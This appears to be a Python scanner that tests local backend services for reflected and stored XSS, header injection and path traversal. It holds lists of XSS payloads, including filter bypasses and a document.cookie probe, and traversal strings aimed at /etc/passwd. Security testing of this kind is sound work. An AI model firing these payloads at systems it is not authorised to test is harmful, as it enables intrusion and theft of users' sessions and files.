#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) Hack Script
Tests for XSS vulnerabilities in backend services
"""

import os
import time
import requests
import json
import sys
import html

# Get the directory of this script for portable paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

class XSSHacker:
    def __init__(self, base_urls):
        self.base_urls = base_urls
        self.findings = []
        
    def test_reflected_xss(self, url, params):
        """Test for reflected XSS"""
        print(f"[*] Testing reflected XSS on {url}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<svg/onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<script>alert(document.cookie)</script>",
            "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
            "<div style=\"background-image:url(javascript:alert('XSS'))\">",
        ]
        
        for param, value in params.items():
            for payload in xss_payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    response = requests.get(url, params=test_params, timeout=5)
                    
                    # Check if payload is reflected without encoding
                    if payload in response.text:
                        self.findings.append({
                            "type": "Reflected XSS",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "response_code": response.status_code
                        })
                        print(f"  [!] XSS found in param '{param}': {payload[:40]}...")
                        return True
                except Exception as e:
                    pass
                    
        return False
    
    def test_stored_xss(self, url, token, payloads):
        """Test for stored XSS"""
        print(f"[*] Testing stored XSS on {url}")
        
        if not token:
            print("  [-] No token, skipping stored XSS test")
            return
            
        headers = {"Authorization": f"Bearer {token}"}
        
        for payload in payloads[:5]:  # Test a subset
            try:
                # Try to store the payload
                response = requests.post(url, json={
                    "first_name": payload,
                    "last_name": "Test",
                    "bio": payload
                }, headers=headers, timeout=5)
                
                # Then try to retrieve it
                get_response = requests.get(f"{self.base_urls.get('user_service')}/profile", 
                                          headers=headers, timeout=5)
                
                if payload in get_response.text:
                    self.findings.append({
                        "type": "Stored XSS",
                        "url": url,
                        "payload": payload,
                        "evidence": "Payload reflected in response"
                    })
                    print(f"  [!] Stored XSS found: {payload[:40]}...")
                    return True
            except Exception as e:
                pass
                
        return False
    
    def test_json_xss(self, url, token):
        """Test for XSS in JSON endpoints"""
        print(f"[*] Testing XSS in JSON on {url}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "{\"xss\": \"<script>alert('XSS')</script>\"}",
        ]
        
        if not token:
            return
            
        headers = {"Authorization": f"Bearer {token}"}
        
        for payload in xss_payloads:
            try:
                response = requests.post(url, 
                                       data=payload,
                                       headers={"Content-Type": "application/json",
                                               "Authorization": f"Bearer {token}"},
                                       timeout=5)
                
                if payload in response.text:
                    self.findings.append({
                        "type": "XSS in JSON",
                        "url": url,
                        "payload": payload,
                        "response": response.status_code
                    })
                    print(f"  [!] XSS in JSON: {payload[:40]}...")
            except Exception as e:
                pass
    
    def test_header_injection(self, url):
        """Test for HTTP header injection"""
        print(f"[*] Testing header injection on {url}")
        
        payloads = [
            "test\r\nX-Injected: header",
            "test\nX-Injected: header",
            "test%0D%0AX-Injected: header",
        ]
        
        for payload in payloads:
            try:
                response = requests.get(url, 
                                      headers={"X-Custom": payload},
                                      timeout=5)
                
                if "X-Injected" in response.headers:
                    self.findings.append({
                        "type": "HTTP Header Injection",
                        "url": url,
                        "payload": payload,
                        "response": response.status_code
                    })
                    print(f"  [!] Header injection found")
                    return True
            except Exception as e:
                pass
                
        return False
    
    def test_path_traversal(self, url):
        """Test for path traversal"""
        print(f"[*] Testing path traversal on {url}")
        
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
        ]
        
        for payload in payloads:
            try:
                response = requests.get(f"{url}/{payload}", timeout=5)
                
                if "root:" in response.text or "Administrator" in response.text:
                    self.findings.append({
                        "type": "Path Traversal",
                        "url": url,
                        "payload": payload,
                        "response": response.status_code
                    })
                    print(f"  [!] Path traversal found: {payload}")
                    return True
            except Exception as e:
                pass
                
        return False
    
    def run_attack(self):
        """Execute XSS attacks"""
        print("\n" + "="*60)
        print("XSS HACK ATTACK")
        print("="*60)
        
        user_service = self.base_urls.get('user_service', 'http://localhost:8081')
        
        # Get a token first
        token = None
        try:
            response = requests.post(f"{user_service}/register", json={
                "email": f"xsstest_{int(time.time())}@example.com",
                "username": f"xsstest_{int(time.time())}",
                "password": "Password123!",
                "first_name": "XSS",
                "last_name": "Test",
                "age": 25
            }, timeout=5)
            
            if response.status_code == 201:
                token = response.json().get('token')
        except:
            pass
        
        # Test XSS in search parameters
        self.test_reflected_xss(f"{user_service}/users/search", {"q": "<script>"})
        
        # Test stored XSS in profile
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ]
        
        self.test_stored_xss(f"{user_service}/profile", token, xss_payloads)
        
        # Test path traversal
        self.test_path_traversal(user_service)
        
        print(f"\n[*] XSS attack completed. Found {len(self.findings)} vulnerabilities.")
        return self.findings


def main():
    import time
    
    base_urls = {
        'user_service': 'http://localhost:8081',
        'event_service': 'http://localhost:8082',
        'message_service': 'http://localhost:8083'
    }
    
    hacker = XSSHacker(base_urls)
    findings = hacker.run_attack()
    
    # Save report - use relative path
    report_file = os.path.join(SCRIPT_DIR, "hack_report_05_xss.txt")
    with open(report_file, 'w') as f:
        f.write("XSS HACK REPORT\n")
        f.write("="*60 + "\n\n")
        f.write(f"Total vulnerabilities found: {len(findings)}\n\n")
        
        for i, finding in enumerate(findings, 1):
            f.write(f"Finding #{i}\n")
            for key, value in finding.items():
                f.write(f"{key}: {value}\n")
            f.write("-"*60 + "\n\n")
    
    print(f"\n[+] Report saved to: {report_file}")
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
